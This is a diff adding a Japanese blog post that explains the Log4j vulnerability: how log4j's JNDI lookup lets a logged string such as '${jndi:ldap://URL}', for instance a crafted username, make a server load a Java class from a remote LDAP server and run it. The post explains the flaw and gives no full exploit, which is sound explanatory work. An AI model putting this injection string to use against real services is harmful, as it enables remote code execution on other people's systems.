@@ -1,0 +1,99 @@
+<!doctype html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>
+log4jの脆弱性について
+</title>
+
+
+<link rel="stylesheet" type="text/css" href="../css/default.css" >
+
+<style type="text/css">
+</style>
+
+<!-- highlight.js -->
+<link rel="stylesheet" type="text/css" href="../css/github.css">
+<script type="text/javascript" src="../js/highlight.pack.js"></script>
+<script type="text/javascript">hljs.initHighlightingOnLoad();</script>
+
+<!-- mathjax CDN -->
+<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async>
+</script>
+
+
+</head>
+
+<body>
+
+<header>
+<h1><a href="https://ezoeryou.github.io/blog/">本の虫</a></h1>
+
+<p>
+著者：江添亮<br>GitHub pages: <a href="https://ezoeryou.github.io/blog/">https://ezoeryou.github.io/blog/</a><br>
+Blogger: <a href="http://cpplover.blogspot.jp/">http://cpplover.blogspot.jp/</a><br>
+メール: boostcpp@gmail.com<br>
+Twitter: <a href="https://twitter.com/EzoeRyou">https://twitter.com/EzoeRyou</a><br>
+GitHub: <a href="https://github.com/EzoeRyou">https://github.com/EzoeRyou</a>
+</p>
+<p>
+<a href="http://www.amazon.co.jp/registry/wishlist/1X43J4K0NJVHK">アマゾンの江添のほしい物リスト</a>を著者に送るとブログ記事のネタになる
+</p>
+
+<p>
+筆者にブログのネタになる品物を直接送りたい場合、住所をメールで質問してください。
+</p>
+</header>
+
+
+<article>
+<h1>
+log4jの脆弱性について
+</h1>
+
+<p>
+log4jとはJava用のloggingライブラリだ。loggingライブラリというのはログとして記録すべき文字列を受け取り、それをどこかに出力するものだ。文字列の中身を通常のloggingライブラリは気にしない。
+</p>
+
+<p>
+log4jが通常のloggingライブラリと違うのは、文字列の中身を見て、一部の文字列を変数とみなして置換することだ。これはlog4jのドキュメントではlookupと呼ばれている。
+</p>
+
+<p>
+<a href="https://logging.apache.org/log4j/2.x/manual/lookups.html">Log4j – Log4j 2 Lookups</a>
+</p>
+
+<p>
+例えばプログラムを実行中のJava runtimeのバージョンをログに含めたい場合は、"Java Runtime: ${java:runtime}"などとすると、"Java Runtgime: Java(TM) SE Runtime Environment (build 1.7.0_67-b01) from Oracle Corporation"などのように置換される。"${java:runtime}"という変数が置換されている。
+</p>
+
+<p>
+今回問題となっているのはJndi Lookupだ。これはJavaのJava Naming and Directory Interfaceによる変数名の置換で、ネットワーク越しに変数に相当する値を検索することができる。その中にLDAPも含まれる。例えば"${jndi:ldap://someremoteclass}"のようになる。
+</p>
+
+<p>
+問題は、このURLに.を含めることにより、lg4jは任意のリモートのLDAPサーバーからjava classファイルをダウンロードして読み込んでしまうのだ。
+</p>
+
+<p>
+なので悪意あるjava classファイルとそれをホストするLDAPサーバーを用意して、ターゲットとなるJavaで動きlog4jを使っているプログラムに"${jndi:ldap://URL}"の形でログ出力されるようにすれば、任意のコード実行が可能になる。
+</p>
+
+<p>
+例えば、Javaで実装されたオンラインゲームサーバーがあり、ログインしたユーザー名をログに出力する作りになっていた場合、ユーザー名に仕込んでおくことでお手軽に任意コード実行ができてしまう。ユーザーがログに出力される文字列を操作可能なlog4jを使うJavaで実装されたオンラインサービスは軒並み影響を受ける。問題は、log4jはJavaにおけるloggingライブラリとしてとても有名なのだそうだ。
+</p>
+
+<p>
+参考になった書き込み：<a href="https://news.ycombinator.com/item?id=29507357">https://news.ycombinator.com/item?id=29507357</a>
+</p>
+
+
+</article>
+
+<footer>
+<p>
+CC BY-SA 4.0: This work is licensed under a <a rel="license" href="http://creativecommons.org/licenses/by-sa/4.0/">Creative Commons Attribution-ShareAlike 4.0 International License</a>.
+</p>
+</footer>
+</body>
+</html>
